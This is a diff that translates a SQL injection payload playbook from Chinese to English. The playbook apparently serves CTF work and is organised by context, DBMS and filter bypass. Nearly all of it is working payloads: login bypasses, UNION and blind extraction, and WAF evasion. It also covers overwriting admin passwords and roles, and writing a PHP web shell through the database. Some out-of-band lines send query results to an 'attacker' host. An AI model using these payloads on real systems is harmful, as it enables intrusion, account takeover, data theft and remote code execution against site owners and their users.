@@ -1,10 +1,10 @@
 # SQL Injection Playbook
 
-这是 SQL 注入绕过与利用载荷清单，按上下文、过滤条件和 DBMS 差异选用。NoSQL/GraphQL 与 ORM/查询 DSL 细节分别看 `nosql-graphql.md`、`orm-query-dsl.md`。
+Use this payload playbook by context, filter behavior, and DBMS. For NoSQL/GraphQL and ORM/query DSL cases, read `nosql-graphql.md` and `orm-query-dsl.md`.
 
-## 上下文与入口
+## Contexts And Entry Points
 
-### 数字上下文
+### Numeric Context
 
 ```sql
 1 AND 1=1
@@ -15,19 +15,19 @@
 1;SELECT 1
 ```
 
-闭合方式通常不需要引号，适合绕过 quote 过滤。若参数被强转 int，尝试科学计数法、符号、数组/JSON 类型、重复参数或后端二次拼接点。
+Numeric contexts often need no quotes, so they are useful when quote characters are filtered. If the parameter is cast to an integer, test scientific notation, signs, arrays/JSON types, duplicate parameters, or a later server-side concatenation point.
 
-### 字符串上下文
+### String Context
 
 ```sql
 ' AND '1'='1
 ' AND '1'='2
 ' OR '1'='1'--
 ' OR '1'='1'#
-' OR '1'='1'/* 
+' OR '1'='1'/*
 ```
 
-常见闭合：
+Common closures:
 
 ```sql
 '
@@ -40,7 +40,7 @@
 %"))
 ```
 
-### LIKE / 搜索
+### LIKE / Search
 
 ```sql
 %' AND 1=1--
@@ -49,11 +49,11 @@
 %' ESCAPE '\'
 ```
 
-搜索场景里 `%`、`_`、转义符、大小写和 collation 都可能影响 oracle。前缀提取可用 `LIKE 'a%'`、`GLOB 'a*'`、`REGEXP '^a'` 或 DBMS 字符函数。
+In search flows, `%`, `_`, escape characters, case sensitivity, and collation can all affect the oracle. Prefix extraction can use `LIKE 'a%'`, `GLOB 'a*'`, `REGEXP '^a'`, or DBMS string functions.
 
-### ORDER BY / 标识符
+### ORDER BY / Identifiers
 
-绑定参数保护不了列名、表名、排序方向：
+Bind parameters do not protect column names, table names, or sort direction:
 
 ```sql
 id
@@ -64,16 +64,16 @@ CASE WHEN 1=2 THEN id ELSE title END
 (SELECT CASE WHEN 1=1 THEN id ELSE title END)
 ```
 
-如果只允许方向：
+If only direction is controllable:
 
 ```sql
 ASC,(CASE WHEN 1=1 THEN 1 ELSE 1/0 END)
 DESC,(SELECT CASE WHEN 1=2 THEN 1 ELSE 1/0 END)
 ```
 
-MSSQL/Oracle 排序注入可借错误或子查询制造差异；MySQL 可用 `extractvalue/updatexml`、`if()` 或子查询。
+MSSQL and Oracle sort injection can use errors or subqueries to create differences. MySQL can use `extractvalue/updatexml`, `if()`, or subqueries.
 
-### INSERT / UPDATE / 注册资料
+### INSERT / UPDATE / Profile Data
 
 ```sql
 a'
@@ -82,17 +82,17 @@ a' WHERE 1=2--
 a', role='admin'--
 ```
 
-MySQL 可关注：
+MySQL-specific:
 
 ```sql
 ON DUPLICATE KEY UPDATE password='known',role='admin'
 ```
 
-UPDATE/改密场景常见目标是改到指定用户、让 WHERE 条件扩大、或把目标数据写进自己可读字段。
+In UPDATE or password-reset flows, common goals are changing the target user, broadening the `WHERE` condition, or writing target data into a field the attacker can read.
 
-### 二阶 / 二次查询 / Routed SQLi
+### Second-Order / Routed SQLi
 
-第一处存储 payload，第二处触发查询：
+Store the payload in one step and trigger the query in another:
 
 ```sql
 stored_username = admin'--
@@ -100,16 +100,16 @@ stored_email = x' OR '1'='1
 stored_sort = CASE WHEN 1=1 THEN id ELSE title END
 ```
 
-第一条查询结果进入第二条查询时，用 UNION 或可控字段拼出第二阶段 payload：
+When a first query result feeds a second query, use UNION or a controllable field to build the second-stage payload:
 
 ```sql
 UNION SELECT 'admin''--',2,3
 UNION SELECT 0x61646d696e272d2d,2,3
 ```
 
-## DBMS 差异
+## DBMS Differences
 
-### 指纹与当前值
+### Fingerprint And Current Values
 
 ```sql
 -- MySQL
@@ -137,7 +137,7 @@ SYS_CONTEXT('USERENV','CURRENT_SCHEMA')
 banner FROM v$version
 ```
 
-### 元数据入口
+### Metadata Sources
 
 ```sql
 -- MySQL
@@ -167,46 +167,46 @@ all_tab_columns
 user_tables
 ```
 
-### 常用函数差异
+### Common Function Differences
 
 ```sql
--- 截取
+-- substring
 SUBSTR(x,1,1)              MySQL / SQLite / Oracle
 SUBSTRING(x,1,1)           PostgreSQL / MSSQL
 
--- 长度
+-- length
 LENGTH(x)                  MySQL / SQLite / PostgreSQL / Oracle
 LEN(x)                     MSSQL
 
--- 字符码
+-- character code
 ASCII(SUBSTR(x,1,1))       MySQL / PostgreSQL / MSSQL / Oracle
 unicode(substr(x,1,1))     SQLite
 
--- 拼接
-CONCAT(a,b)                MySQL / MSSQL newer
+-- concatenation
+CONCAT(a,b)                MySQL / newer MSSQL
 a||b                       PostgreSQL / Oracle / SQLite
 a+b                        MSSQL
 
--- 单行
+-- single row
 LIMIT 1 OFFSET 0           MySQL / PostgreSQL / SQLite
 TOP 1                      MSSQL
 ROWNUM=1                   Oracle
-FETCH FIRST 1 ROWS ONLY    Oracle / PostgreSQL / MSSQL newer
+FETCH FIRST 1 ROWS ONLY    Oracle / PostgreSQL / newer MSSQL
 ```
 
-### 延迟函数
+### Delay Functions
 
 ```sql
 SLEEP(3)                                  MySQL
 pg_sleep(3)                               PostgreSQL
 WAITFOR DELAY '00:00:03'                  MSSQL
 DBMS_LOCK.SLEEP(3)                        Oracle
-randomblob(100000000)                     SQLite 重计算型延迟
+randomblob(100000000)                     SQLite recomputation delay
 ```
 
-## UNION 回显
+## UNION Echo
 
-### 列数与显示位
+### Column Count And Visible Slots
 
 ```sql
 ORDER BY 1
@@ -219,7 +219,7 @@ UNION ALL SELECT 1,2,3
 AND 1=0 UNION SELECT 1,2,3
 ```
 
-### 当前库和版本
+### Current Database And Version
 
 ```sql
 -- MySQL
@@ -238,7 +238,7 @@ UNION SELECT DB_NAME(),SYSTEM_USER,@@version
 UNION SELECT USER,banner,NULL FROM v$version
 ```
 
-### 表、列、目标数据
+### Tables, Columns, Target Data
 
 ```sql
 -- MySQL
@@ -263,7 +263,7 @@ UNION SELECT table_name,NULL,NULL FROM all_tables
 UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='USERS'
 ```
 
-### 类型不匹配
+### Type Mismatch
 
 ```sql
 CAST(x AS CHAR)
@@ -274,19 +274,19 @@ TO_CHAR(x)
 NULL
 ```
 
-### 关键字被拦
+### Blocked Keywords
 
 ```sql
 UNION/**/SELECT
 UNION%0aSELECT
-UNIunionON SELselectECT          单次删除型过滤
+UNIunionON SELselectECT
 UNION ALL SELECT
-/*!50000UNION*/ /*!50000SELECT*/ MySQL versioned comment
+/*!50000UNION*/ /*!50000SELECT*/
 ```
 
-## 布尔 / 错误 / 时间盲注
+## Blind Or Error-Based Extraction
 
-### 布尔
+### Boolean
 
 ```sql
 AND 1=1
@@ -297,7 +297,7 @@ AND (SELECT COUNT(*) FROM users)>0
 AND EXISTS(SELECT 1 FROM users WHERE username='admin')
 ```
 
-### 错误
+### Error
 
 ```sql
 AND CASE WHEN 1=1 THEN 1 ELSE 1/0 END
@@ -317,7 +317,7 @@ AND 1=CONVERT(int,(SELECT DB_NAME()))
 AND 1=TO_NUMBER((SELECT USER FROM dual))
 ```
 
-### 时间
+### Time
 
 ```sql
 -- MySQL
@@ -347,9 +347,9 @@ UTL_INADDR.GET_HOST_ADDRESS((SELECT USER FROM dual)||'.attacker')
 LOAD_FILE('\\\\attacker\\share\\x')
 ```
 
-## 登录与返回行控制
+## Login And Returned-Row Control
 
-### 万能密码
+### Classic Login Bypass
 
 ```sql
 ' OR '1'='1'--
@@ -359,7 +359,7 @@ admin'--
 ') OR ('1'='1
 ```
 
-### 控制返回用户
+### Choose The Returned User
 
 ```sql
 admin' AND '1'='1'--
@@ -368,7 +368,7 @@ admin' AND '1'='2'--
 ' OR role='admin' ORDER BY id LIMIT 1--
 ```
 
-### UNION 伪造用户行
+### Forge A User Row With UNION
 
 ```sql
 ' AND 1=0 UNION SELECT 'admin','hash','admin'--
@@ -376,10 +376,10 @@ admin' AND '1'='2'--
 ' AND 1=0 UNION SELECT 'admin','$2b$12$knownbcrypt','admin'--
 ```
 
-### 反斜杠逃逸 / 截断 / 注释
+### Backslash Escape / Truncation / Comments
 
 ```sql
-username=\ 
+username=\
 password= OR 1=1--
 ```
 
@@ -389,18 +389,18 @@ admin'-- -
 admin'/*
 ```
 
-如果密码先哈希，优先伪造兼容哈希行、找固定哈希比较、或让查询返回不需要密码验证的路径。
+If the password is hashed before comparison, prefer forging a compatible hash row, finding fixed-hash comparison behavior, or making the query return a path that skips password validation.
 
-## 非 SELECT 利用
+## Non-SELECT Exploitation
 
-### INSERT 多行 / 列错位
+### INSERT Multi-Row / Column Shift
 
 ```sql
 abc'),('attacker','knownpass','admin')--
 abc', 'x'),('attacker','knownpass')--
 ```
 
-### UPDATE 覆盖
+### UPDATE Overwrite
 
 ```sql
 x', role='admin' WHERE username='attacker'--
@@ -408,7 +408,7 @@ x', password='known' WHERE username='admin'--
 x' OR username='admin'--
 ```
 
-### 写文件 / RCE 辅助
+### File Write / RCE Helpers
 
 ```sql
 -- MySQL
@@ -427,11 +427,11 @@ CREATE TABLE pwn.x(dataz text)
 INSERT INTO pwn.x VALUES('<?php system($_GET["cmd"]); ?>')
 ```
 
-这些能力依赖权限和配置；CTF 中若已有 FILE/xp_cmdshell/COPY/ATTACH 证据再用。
+These depend on permissions and configuration. In CTF targets, use them only after observing evidence for FILE, `xp_cmdshell`, `COPY`, `ATTACH`, or an equivalent capability.
 
-## 过滤绕过
+## Filter Bypasses
 
-### 空白被禁
+### Whitespace Blocked
 
 ```sql
 UNION/**/SELECT
@@ -441,7 +441,7 @@ UNION%09SELECT
 1/**/AND/**/1=1
 ```
 
-### 引号被禁
+### Quotes Blocked
 
 ```sql
 0x61646d696e                         MySQL/MSSQL hex
@@ -452,19 +452,20 @@ NCHAR(97)+NCHAR(100)                 MSSQL
 X'61646d696e'                        SQLite blob/string contexts
 ```
 
-### 逗号被禁
+### Comma Blocked
 
 ```sql
 LIMIT 1 OFFSET 0
 SUBSTR(x FROM 1 FOR 1)
 MID(x FROM 1 FOR 1)
-JOIN 替代多列组合
 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b
 ```
 
-### 注释被禁
+Use `JOIN` to replace multi-column comma syntax where possible.
 
-补齐原查询尾部而不是依赖注释：
+### Comments Blocked
+
+Complete the original query tail instead of relying on a comment:
 
 ```sql
 ' AND '1'='1
@@ -473,9 +474,9 @@ UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b
 ') OR ('1'='1
 ```
 
-或用闭合括号/引号让后续语法自然有效。
+Or close parentheses and quotes so the following syntax remains naturally valid.
 
-### 比较符被禁
+### Comparison Operators Blocked
 
 ```sql
 LIKE
@@ -489,7 +490,7 @@ NOT BETWEEN
 STRCMP(a,b)
 ```
 
-### `AND` / `OR` 被禁
+### `AND` / `OR` Blocked
 
 ```sql
 &&
@@ -500,7 +501,7 @@ CASE WHEN
 IF(condition,a,b)
 ```
 
-### `UNION` / `SELECT` 被禁
+### `UNION` / `SELECT` Blocked
 
 ```sql
 UN/**/ION SEL/**/ECT
@@ -511,13 +512,13 @@ VALUES(...)
 TABLE table_name
 ```
 
-### `information_schema` 被禁
+### `information_schema` Blocked
 
 ```sql
 -- MySQL
 mysql.innodb_table_stats
 sys.schema_table_statistics
-SHOW TABLES             stacked/query console 场景
+SHOW TABLES
 
 -- SQLite
 sqlite_master
@@ -538,7 +539,7 @@ all_tab_columns
 user_tables
 ```
 
-### 函数名被禁
+### Function Name Blocked
 
 ```sql
 SUBSTR -> SUBSTRING / MID / LEFT / RIGHT
@@ -549,7 +550,7 @@ IF     -> CASE WHEN
 CONCAT -> || / + / CONCAT_WS
 ```
 
-### 大小写 / 单次删除型过滤
+### Case Or Single-Delete Filters
 
 ```sql
 UnIoN SeLeCt
@@ -559,37 +560,37 @@ SEL%0aECT
 /*!50000SELECT*/
 ```
 
-### 编码与解析差异
+### Encoding And Parser Differences
 
 ```text
-URL 编码 / 双 URL 编码
-JSON 数字、布尔、null、数组、对象类型替换
-重复参数覆盖：id=1&id=payload
-分隔符污染：id=1;payload
-宽字节：GBK/Shift-JIS 中 %bf%27、%df%27 一类只在对应编码链存在时用
-XML 实体：&#x27;、&apos;
-HQL/ORM 空白：U+00A0、注释不一定可用
+URL encoding / double URL encoding
+JSON number, boolean, null, array, or object type substitution
+Duplicate parameter overwrite: id=1&id=payload
+Delimiter pollution: id=1;payload
+Wide bytes: GBK/Shift-JIS payloads such as %bf%27 or %df%27 only when that encoding chain exists
+XML entities: &#x27; and &apos;
+HQL/ORM whitespace: U+00A0, comments may not work
 ```
 
-### WAF 正则异常
+### WAF Regex Edge Cases
 
 ```text
-关键字嵌套：SELSELECTECT
-长输入触发正则回溯失败
-版本注释绕 MySQL WAF
-参数拆分后端拼接：q=UNI&q=ON SELECT
+Keyword nesting: SELSELECTECT
+Long input causing regex backtracking failure
+MySQL versioned comments
+Backend concatenation after parameter splitting: q=UNI&q=ON SELECT
 ```
 
-## 常用目标数据
+## Common Target Data
 
 ```sql
--- 当前身份/库
+-- current identity/database
 database(), user(), version()
 current_database(), current_user
 DB_NAME(), SYSTEM_USER, @@version
 USER, SYS_CONTEXT('USERENV','CURRENT_SCHEMA')
 
--- 用户表候选
+-- table candidates
 users
 user
 accounts
@@ -599,7 +600,7 @@ credentials
 flags
 secrets
 
--- 列候选
+-- column candidates
 username
 password
 passwd
